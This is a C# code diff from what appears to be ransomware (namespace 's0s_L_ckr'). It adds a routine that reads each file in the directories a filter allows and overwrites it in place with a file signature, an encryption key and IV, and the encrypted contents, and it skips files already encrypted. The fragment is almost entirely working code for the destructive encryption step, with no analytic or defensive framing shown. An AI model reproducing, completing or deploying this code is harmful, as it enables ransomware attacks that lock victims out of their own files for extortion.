@@ -61,7 +61,7 @@ namespace s0s_L_ckr
 #if DEBUG
             Trace.WriteLine("");
             Trace.WriteLine($"[*] EncrDir {directoryInfo.Name}");
-##endif
+#endif
             //Checking Directory Filter
             if (!Comn.DireInFil(directoryInfo.FullName))
             {
@@ -121,8 +121,38 @@ namespace s0s_L_ckr
                     //Reading Data in files
                     Byte[] fileDat = null;
                     FileMgr.ReadFil(file, ref fileDat);
+
+                    //Encrypt File
+                    using (FileStream fileStream = File.OpenWrite(file.FullName))
+                    {
+                        fileStream.Position = 0;
+
+                        //File Structure for encrypted data
+                        fileStream.Write(ConfigMgr.FILE_SIGN, 0, ConfigMgr.FILE_SIGN_SIZE); ;
+                        fileStream.Write(CriptoKeyMgr.CURR_FIL_ENC_KEY, 0, CriptoKeyMgr.CURR_FIL_ENC_KEY.Length);
+                        fileStream.Write(CriptoKeyMgr.CURR_FIL_ENC_IV, 0, CriptoKeyMgr.CURR_FIL_ENC_IV.Length);
+                        fileStream.Flush();
+
+                        //Write Encrypted data to section
+                        CriptoFilMgr.Encrypt(fileStream, ref fileDat);
+                    }
+                }
+                else
+                {
+#if DEBUG
+                    Trace.WriteLine("[+] File Already Encrypted");
+#endif
                 }
             }
+            else
+            {
+#if DEBUG
+                Trace.WriteLine("[+] File Filtr not Allowed");
+#endif
+            }
+#if DEBUG
+            Trace.Unindent();
+#endif
         }
     }
 }
